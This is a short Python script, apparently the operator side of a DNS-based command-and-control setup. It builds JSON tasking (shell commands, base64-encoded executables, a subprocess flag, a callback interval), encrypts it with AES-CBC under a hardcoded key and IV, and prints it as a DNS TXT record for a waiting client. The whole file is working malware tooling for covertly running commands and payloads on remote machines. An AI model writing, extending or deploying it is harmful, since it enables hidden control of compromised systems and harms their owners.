import json
import base64
from Crypto.Cipher import AES

# 16-byte AES key and IV (must match your client)
AES_KEY = b'mysecretaeskey12'
AES_IV = b'initialvector123'

def pad(data):
    pad_len = 16 - (len(data) % 16)
    return data + chr(pad_len) * pad_len

def encrypt_json(json_data):
    padded = pad(json.dumps(json_data)).encode()
    cipher = AES.new(AES_KEY, AES.MODE_CBC, AES_IV)
    encrypted = cipher.encrypt(padded)
    return base64.b64encode(encrypted).decode()

def generate_dns_command():
    print("=== DNS Command Generator ===\n")
    
    cmd_id = input("Command ID (e.g., 1234): ").strip()
    if not cmd_id:
        print("[-] ID is required.")
        return
    
    command = input("Shell Command (leave blank if not needed): ").strip()
    executable = input("Executable Base64 (leave blank if not needed): ").strip()
    subprocess_flag = input("Run in subprocess? (y/n): ").strip().lower() == "y"
    try:
        ping_after = int(input("Ping again after (seconds): ").strip())
    except ValueError:
        ping_after = 10

    command_json = {
        "id": cmd_id,
        "pingafter": ping_after
    }

    if command:
        command_json["command"] = command
        command_json["command-subprocess"] = subprocess_flag

    if executable:
        command_json["executable"] = executable

    encrypted = encrypt_json(command_json)

    print("\n🔐 Encrypted DNS TXT Record:\n")
    print(encrypted)

if __name__ == "__main__":
    generate_dns_command()
